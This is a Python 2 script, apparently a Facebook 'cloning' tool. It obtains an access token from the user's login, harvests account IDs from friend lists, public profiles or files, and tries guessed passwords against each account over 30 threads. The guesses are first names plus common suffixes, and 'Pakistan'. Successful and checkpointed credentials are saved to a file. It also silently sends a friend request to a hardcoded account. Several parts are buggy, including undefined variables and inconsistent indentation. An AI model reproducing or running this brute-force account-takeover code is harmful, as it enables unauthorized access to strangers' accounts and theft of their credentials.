#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # biru
M  = '\033[1;91m' # biru
H  = '\033[1;92m' # biru
K = '\033[1;93m' # biru
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # biru
O = '\033[1;96m' # kuning

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 gift.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;96m|', '\033[1;92m/', '\033[1;95m-', '\033[1;91m\\']):
        if done:
            break
        sys.stdout.write('\r\033[1;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

def keluar():
	print "\033[1;97m{\033[1;91m!\033[1;97m} Keluar"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
		
B = '\x1b[1;94m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
P = '\x1b[1;95m'
Y = '\x1b[1;93m'
logo = '\n\x1b[1;97m╔════╗╔═══╗╔╗─╔╗╔═══╗╔═══╗╔═══╗\n\x1b[1;97m╚══╗═║║╔═╗║║║─║║║╔═╗║║╔═╗║║╔═╗║\n\x1b[1;97m──╔╝╔╝║║─║║║╚═╝║║║─║║║║─║║║╚═╝║\n\x1b[1;97m─╔╝╔╝─║╚═╝║║╔═╗║║║─║║║║─║║║╔╗╔╝\n\x1b[1;97m╔╝═╚═╗║╔═╗║║║─║║║╚═╝║║╚═╝║║║║╚╗\n\x1b[1;97m╚════╝╚╝─╚╝╚╝─╚╝╚═══╝╚═══╝╚╝╚═╝\n\x1b[1;92m>>============================================\n\x1b[1;97m>> \x1b[1;97mAuthor \x1b[1;97m: \x1b[1;97mZahoor Ehali\n\x1b[1;97m>> \x1b[1;97mGithub \x1b[1;97m: \x1b[1;97mhttps://github.com/PAK-CYBER-404 \n\x1b[1;97m>> \x1b[1;97mYoutube \x1b[1;97m: \x1b[1;97mhttps://Youtube.com/Technical Khan\n\x1b[1;92m>>============================================\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92..99% \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)
		
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    time.sleep(0.05)
    print '\x1b[1;97m[1]\x1b[1;97m Login with Facebook \x1b[1;97m(\x1b[1;91mfb login\x1b[1;97m) '
    time.sleep(0.05)
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    time.sleep(0.05)
    print '\x1b[1;97m[2]\x1b[1;97m Login with access token \x1b[1;97m(\x1b[1;91mTokenz\x1b[1;97m)'
    time.sleep(0.05)
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    time.sleep(0.05)
    print '\x1b[1;97m[0]\x1b[1;97m Logout        '
    time.sleep(0.05)
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;97mChoose an Option\xe2\x95\x90\xe2\x95\xac\xe2\x95\x90\xe2\x95\x90\xe2\x96\xba\x1b[1;92m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_login()
    elif peak == '1':
        login1()
    elif peak == '2':
        tokenz()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def login1():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        time.sleep(0.05)
        print logo
        print '\x1b[1;96m \xc2\xab-------------------------------------------\xc2\xbb'
        print '\x1b[1;97m[\xe2\x9c\xbe]\x1b[1;97mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;97m[\xe2\x9c\xbe]'
        time.sleep(0.05)
        print '\x1b[1;97m[\xe2\x9c\xbe]\x1b[1;97mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;97m[\xe2\x9c\xbe]'
        time.sleep(0.05)
        id = raw_input('\x1b[1;92m[!!] \x1b[1;97mID/Email \x1b[1;97m>> \x1b[1;97m')
        pwd = raw_input('\x1b[1;92m[!!] \x1b[1;97mPassword \x1b[1;97m>> \x1b[1;97m')
        print '\x1b[1;97m \xc2\xab--------------------------------------------\xc2\xbb'
        tik()
        try:
            br.open('https://m.facebook.com/Pak.Cyber.Tricks')
        except mechanize.URLError:
            print '\n\x1b[1;97mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                jalan('\n\x1b[1;97mLogin Successful...')
                os.system('xdg-open https://m.facebook.com/Pak.Cyber.Tricks')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;97mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91mYour Account is on CP '
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def tokenz():
    os.system('clear')
    print logo
    print '\x1b[1;97m \xc2\xab--------------------------------------------\xc2\xbb'
    toket = raw_input('\x1b[1;97m[+]\x1b[1;92m Give Token\x1b[1;97>>\x1b[1;97m ')
    print '\x1b[1;97m \xc2\xab--------------------------------------------\xc2\xbb'
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        print '\n\x1b[1;91mYour Account is on Checkpoint :('


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        o = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(o.text)
        nama = a['name']
        id = a['id']
        t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(t.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\x1b[1;91mYour Account is on CP'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97mThere is no internet connection'
        keluar()
 

    os.system('clear')
    print logo
    print '   \x1b[1;97m      \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '   \x1b[1;92m      \xe2\x95\x91\x1b[1;97m[*] Name\x1b[1;97m: ' + nama + '  \t   \x1b[1;97m\xe2\x95\x91'
    print '   \x1b[1;92m      \xe2\x95\x91\x1b[1;97m[*] ID  \x1b[1;97m: ' + id + '        \x1b[1;97m\xe2\x95\x91'
    print '   \x1b[1;92m      \xe2\x95\x91\x1b[1;97m[*] Subs\x1b[1;97m: ' + sub + '                      \x1b[1;97m\xe2\x95\x91'
    print '   \x1b[1;97m      \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;92m[1] \x1b[1;97mStart Cloning'
    print '\x1b[1;92m[2] \x1b[1;97mUpdate Tool'
    print '\x1b[1;92m[0] \x1b[1;97mLogout'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97m>>> \x1b[1;97;40m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        os.system('clear')
        print logo
        print ' \x1b[1;97m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n'
        os.system('git pull origin master')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;92m[1] \x1b[1;97mCrack From Friend List'
    print '\x1b[1;92m[2] \x1b[1;97mCrack From Public ID'
    print '\x1b[1;92m[3] \x1b[1;97mTarget Bruteforce'
    print '\x1b[1;92m[4] \x1b[1;97mCrack From File'
    print '\x1b[1;92m[0] \x1b[1;97mBack'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;92m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;92m[\xe2\x9c\xba] Getting IDs \x1b[1;92m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;92m[*] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\xe2\x9c\xba] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;92m[\xe2\x9c\xba] ID Not Found!'
                raw_input('\n\x1b[1;97m[\x1b[1;92mBack\x1b[1;97m]')
                super()

            print '\x1b[1;92m[\xe2\x9c\xba] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;92m[+] \x1b[1;97mEnter the file name \x1b[1;97m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;92m[!] \x1b[1;91mFile not found'
                raw_input('\n\x1b[1;97m[ \x1b[1;91mExit \x1b[1;97m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_super()
        print '\x1b[1;97m[\xe2\x9c\xba] Total IDs : \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;92m[\xe2\x9c\xba] Please Wait...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\xe2\x9c\xba] Cloning\x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;97m        \xe2\x9d\x88     \x1b[1;91mTo Stop Process Press CTRL+Z \x1b[1;97m    \xe2\x9d\x88'
    print ' \x1b[1;97m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
    jalan(' \x1b[1;92mCloning Started Please Wait...')
    print '\x1b[1;97m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'

    def main(arg):
        global cekpoint,oks
        zowe = arg
        try:
            sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
            os.mkdir('done')
        except OSError:
                pass
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' >> ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CP] \x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1 + ' >> ' + b['name']  
                cek = open('out/CP.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[CP] \x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2 + ' >> ' + b['name']
                    cek = open('out/CP.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[CP] \x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3 + ' >> ' + b['name']
                        cek = open('out/CP.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                        	print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['name']
                        	oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[CP] \x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4 + ' >> ' + b['name']
                            cek = open('out/CP.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                    	else:
                            pass5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass5 + ' >> ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[CP] \x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5 + ' >> ' + b['name']
                                cek = open('out/CP.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Pakistan1'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass6 + ' >> ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[CP] \x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6 + ' >> ' + b['name']
                                    cek = open('out/CP.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Pakistan'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass7 + ' >> ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[CP] \x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7 + ' >> ' + b['name']
                                       	cek = open('out/CP.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)


        except:
             pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x9c\x93\x1b[1;97m] \x1b[1;92mProcess Has Been Completed \x1b[1;97m....'
    print '\x1b[1;92m[+] \x1b[1;92mTotal OK/\x1b[1;97mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;92m[+] \x1b[1;97mCP File Has Been Saved \x1b[1;97m: \x1b[1;97mout/checkpoint.txt'
    raw_input('\n\x1b[1;92m[\x1b[1;97mBack\x1b[1;92m]')
    login()
    
if __name__ == '__main__':
    lisensi()
